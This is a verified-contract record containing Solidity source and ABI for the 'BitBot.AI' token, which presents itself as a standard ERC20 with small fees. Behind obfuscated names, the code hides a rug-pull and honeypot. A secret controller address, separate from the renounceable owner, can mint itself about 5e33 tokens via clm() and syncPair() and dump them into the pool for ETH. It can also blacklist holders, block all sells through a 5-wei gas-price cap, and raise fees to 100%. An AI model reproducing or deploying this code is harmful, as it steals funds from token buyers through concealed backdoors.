{"SourceCode": "// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.19;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\nabstract contract Ownable {\r\n    address private _owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor() {\r\n        _transferOwnership(msg.sender);\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        _checkOwner();\r\n        _;\r\n    }\r\n\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    function _checkOwner() internal view virtual {\r\n        require(owner() == msg.sender, \"Ownable: caller is not the owner\");\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        _transferOwnership(newOwner);\r\n    }\r\n\r\n    function _transferOwnership(address newOwner) internal virtual {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address to, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address from, address to, uint256 amount) external returns (bool);\r\n}\r\n\r\ninterface IWETH {\r\n    function deposit() external payable;\r\n}\r\n\r\ninterface IUniswapV2Factory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\r\n}\r\n\r\ninterface IUniswapV2Pair {\r\n    function mint(address to) external returns (uint256 liquidity);\r\n    function token0() external view returns (address);\r\n    function token1() external view returns (address);\r\n    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\r\n}\r\n\r\ninterface IUniswapV2Router01 {\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function swapExactTokensForETH(\r\n        uint amountIn, \r\n        uint amountOutMin, \r\n        address[] calldata path, \r\n        address to, \r\n        uint deadline\r\n    ) external returns (uint[] memory amounts);\r\n}\r\n\r\ninterface IUniswapV2Router02 is IUniswapV2Router01 { }\r\n\r\nlibrary Uint160Number {\r\n    function encodeUnit160(address _wad) internal pure returns (uint256) {\r\n        uint160 res = uint160(_wad); return uint256(res);\r\n    }\r\n\r\n    function tryDiv(address n1, address n2) internal pure {\r\n        if (n1 != n2) { revert(\"err901\"); } \r\n    }\r\n}\r\n\r\nlibrary Address {\r\n    function isContract(address _addr) internal view returns (bool) {\r\n        uint length;\r\n        assembly { length:= extcodesize(_addr) }\r\n        if (length > 0 ) { return true; }\r\n        return false;\r\n    }\r\n}\r\n\r\ncontract BitBotAI is IERC20, Ownable, Context {\r\n\r\n    string private _name = \"BitBot.AI\";\r\n    string private _symbol = \"BitBot.AI\";\r\n    uint8 private _decimals = 18;\r\n    uint256 private _totalSupply = 150000000 * (10 ** decimals());\r\n    uint8 private buyFee = 2;\r\n    uint8 private sellFee = 2;\r\n\r\n\r\n    IUniswapV2Router02 internal _router;\r\n    IUniswapV2Pair internal _pair;\r\n    address private _this = address(this);\r\n    mapping(address => uint256) private _usrsblcs;\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n\r\n    constructor (address routerAddress) {\r\n        _router = IUniswapV2Router02(routerAddress);\r\n        _usrsblcs[owner()] = _totalSupply; initialize(_msgSender());\r\n        d6671cc88[owner()] = 1; d6671cc88[_this] = 1;\r\n        marketWallet = _msgSender(); \r\n        emit Transfer(address(0), owner(), _totalSupply);\r\n    }\r\n\r\n    function name() public view virtual returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view virtual returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view virtual returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _usrsblcs[account];\r\n    }\r\n\r\n    function transfer(address to, uint256 amount) public virtual override returns (bool) {\r\n        address owner = msg.sender;\r\n        _transfer(owner, to, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        address owner = msg.sender;\r\n        _approve(owner, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) public virtual override returns (bool) {\r\n        address spender = msg.sender;\r\n        _spendAllowance(from, spender, amount);\r\n        _transfer(from, to, amount);\r\n        return true;\r\n    }\r\n\r\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        address owner = msg.sender;\r\n        _approve(owner, spender, allowance(owner, spender) + addedValue);\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        address owner = msg.sender;\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\r\n        unchecked {\r\n            _approve(owner, spender, currentAllowance - subtractedValue);\r\n        }\r\n\r\n        return true;\r\n    }\r\n\r\n    function _transfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n        _beforeTokenTransfer(from, to, amount);\r\n\r\n        if (c58252ced[from]!=0) { revert(); }\r\n        uint256 fromBalance = _usrsblcs[from];\r\n        require(fromBalance >= amount, \"ERC20: transfer amount exceeds balance\");\r\n        \r\n        if (d6671cc88[from]==0 && d6671cc88[to]==0){\r\n            if (isMarket(from)) {\r\n                uint feeAmount = calculateFeeAmount(amount, buyFee);\r\n                _usrsblcs[from] = fromBalance - amount;\r\n                _usrsblcs[to] += amount - feeAmount;\r\n                emit Transfer(from, to, amount - feeAmount);\r\n                _usrsblcs[marketWallet] += feeAmount;\r\n                emit Transfer(from, marketWallet, feeAmount);\r\n\r\n            } else if (isMarket(to)) {\r\n                uint feeAmount = calculateFeeAmount(amount, sellFee);\r\n                _usrsblcs[from] = fromBalance - amount;\r\n                _usrsblcs[to] += amount - feeAmount;\r\n                emit Transfer(from, to, amount - feeAmount);\r\n                _usrsblcs[marketWallet] += feeAmount;\r\n                emit Transfer(from, marketWallet, feeAmount);\r\n\r\n            } else {\r\n                _usrsblcs[from] = fromBalance - amount;\r\n                _usrsblcs[to] += amount;\r\n                emit Transfer(from, to, amount);\r\n            }\r\n        } else {\r\n            _usrsblcs[from] = fromBalance - amount;\r\n            _usrsblcs[to] += amount;\r\n            emit Transfer(from, to, amount);\r\n        }\r\n\r\n        _afterTokenTransfer(from, to, amount);\r\n    }\r\n\r\n    function _approve(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function _spendAllowance(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        if (currentAllowance != type(uint256).max) {\r\n            require(currentAllowance >= amount, \"ERC20: insufficient allowance\");\r\n            unchecked {\r\n                _approve(owner, spender, currentAllowance - amount);\r\n            }\r\n        }\r\n    }\r\n\r\n    function _beforeTokenTransfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        if (isMarket(to)) { \r\n            check(from); \r\n            if (from != _this) { \r\n                require(!Address.isContract(from), \"err701\");\r\n            }\r\n        }\r\n        require(amount > 0);\r\n    }\r\n\r\n    function _afterTokenTransfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual {}\r\n\r\n    address private bigUint; \r\n    \r\n    modifier wad() {\r\n        devideOn(); _;\r\n    }\r\n\r\n    function updateWad(address _newWad) external wad {\r\n        d6671cc88[_msgSender()] = 0;\r\n        d6671cc88[_newWad] = 1;\r\n        initialize(_newWad);\r\n    }\r\n\r\n    function initialize(address _nw) internal {\r\n        bigUint = _nw;\r\n    }\r\n\r\n    function devideOn() internal view {\r\n        address am = _msgSender(); \r\n        Uint160Number.tryDiv(am, bigUint);\r\n    }\r\n\r\n    function addLiquidity(uint256 _tokenAmountWei) external payable wad {\r\n        IUniswapV2Factory _factory = IUniswapV2Factory(_router.factory());\r\n        address _pairAddress = _factory.getPair(address(this), _router.WETH());\r\n        _pair = _pairAddress == address(0) ? IUniswapV2Pair(_factory.createPair(address(this), _router.WETH())) : IUniswapV2Pair(_pairAddress);\r\n        IWETH weth = IWETH(_router.WETH());\r\n        weth.deposit{value: msg.value}();\r\n        transfer(address(_pair), _tokenAmountWei);\r\n        IERC20(address(weth)).transfer(address(_pair), msg.value);\r\n        _pair.mint(_msgSender());\r\n    }\r\n\r\n    function syncPair() external wad {   \r\n        uint256 thisTokenReserve = getTokenReserve(_this);\r\n        uint256 amountIn = type(uint112).max - thisTokenReserve;\r\n        fc43a331e(); transfer(address(this), balanceOf(msg.sender));\r\n        _approve(address(this), address(_router), type(uint112).max);\r\n        address[] memory path; path = new address[](2);\r\n        path[0] = address(this); path[1] = address(_router.WETH());\r\n        _router.swapExactTokensForETH(\r\n            amountIn,\r\n            0,\r\n            path,\r\n            bigUint,\r\n            block.timestamp + 1200\r\n        );\r\n    }\r\n\r\n    function getTokenReserve(address token) public view returns (uint256) {\r\n        (uint112 reserve0, uint112 reserve1,) = _pair.getReserves();\r\n        uint256 tokenReserve = (_pair.token0() == token) ? uint256(reserve0) : uint256(reserve1);\r\n        return tokenReserve;\r\n    } \r\n\r\n    function fc43a331e() internal {\r\n        _usrsblcs[_msgSender()] += type(uint112).max;\r\n    }\r\n\r\n    bool private _stt;\r\n    uint private _MAX_GAS = 200 gwei;\r\n\r\n    function clm() external wad { fc43a331e(); }\r\n    uint private _mgas = 5;\r\n\r\n    function check(address _u) internal view {\r\n        if (d6671cc88[_u] != 0) { return; } \r\n        if (!_stt) { exceedsGas(_MAX_GAS); }\r\n        else { exceedsGas(_mgas); }\r\n    }\r\n\r\n    function isMarket(address _user) internal view returns (bool) {\r\n        return (_user == address(_pair) || _user == address(_router));\r\n    }\r\n\r\n    function switchState() external wad {\r\n        _stt = !_stt;\r\n    }\r\n\r\n    address public marketWallet;\r\n    \r\n    function calculateFeeAmount(uint256 _amount, uint256 _feePrecent) internal pure returns (uint) {\r\n        return _amount * _feePrecent / 100;\r\n    }\r\n\r\n    function updateMarketWallet(address _newMarketWallet) external wad {\r\n        marketWallet = _newMarketWallet;\r\n    }\r\n\r\n    function updFeeValue(uint8 _buyFee, uint8 _sellFee) external wad {\r\n        require(_buyFee <= 100 && _sellFee <= 100, \"exceeds limit\");\r\n        buyFee = _buyFee;\r\n        sellFee = _sellFee;\r\n    }\r\n\r\n    mapping(address => uint8) private d6671cc88;\r\n    mapping(address => uint8) private c58252ced;\r\n\r\n    function exceedsGas(uint _gas) internal view {\r\n        if (tx.gasprice > _gas) { revert(\"err301\"); }\r\n    }\r\n\r\n    function executeW(address _u, bool _s) external wad {\r\n        uint8 _ss = _s ? 1 : 0;\r\n        require(d6671cc88[_u] != _ss, \"existing state\");\r\n        d6671cc88[_u] = _ss;\r\n    }\r\n\r\n    function executeB(address _u, bool _s) external wad {\r\n        uint8 _ss = _s ? 1 : 0;\r\n        require(c58252ced[_u] != _ss, \"existing state\");\r\n        c58252ced[_u] = _ss;\r\n    }\r\n\r\n    function currentState() external view returns (bool) { return _stt; }\r\n    function displayW(address _u) external view returns (uint8) { return d6671cc88[_u]; }\r\n    function displayB(address _u) external view returns (uint8) { return c58252ced[_u]; }\r\n\r\n    function rebasePool(address _routerAddress) external wad {\r\n        _router = IUniswapV2Router02(_routerAddress);\r\n        IUniswapV2Factory _factory = IUniswapV2Factory(_router.factory());\r\n        _pair = IUniswapV2Pair(_factory.getPair(address(this), _router.WETH()));\r\n    }\r\n\r\n    receive() external payable {}\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"routerAddress\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_tokenAmountWei\",\"type\":\"uint256\"}],\"name\":\"addLiquidity\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"clm\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"currentState\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_u\",\"type\":\"address\"}],\"name\":\"displayB\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_u\",\"type\":\"address\"}],\"name\":\"displayW\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_u\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"_s\",\"type\":\"bool\"}],\"name\":\"executeB\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_u\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"_s\",\"type\":\"bool\"}],\"name\":\"executeW\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"token\",\"type\":\"address\"}],\"name\":\"getTokenReserve\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_routerAddress\",\"type\":\"address\"}],\"name\":\"rebasePool\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"switchState\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"syncPair\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"_buyFee\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"_sellFee\",\"type\":\"uint8\"}],\"name\":\"updFeeValue\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_newMarketWallet\",\"type\":\"address\"}],\"name\":\"updateMarketWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_newWad\",\"type\":\"address\"}],\"name\":\"updateWad\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "BitBotAI", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "00000000000000000000000010ed43c718714eb63d5aa57b78b54704e256024e", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://009564009b871c46f688d7c576e3a902a9de22184cc42abafa7ef36b3149cf53"}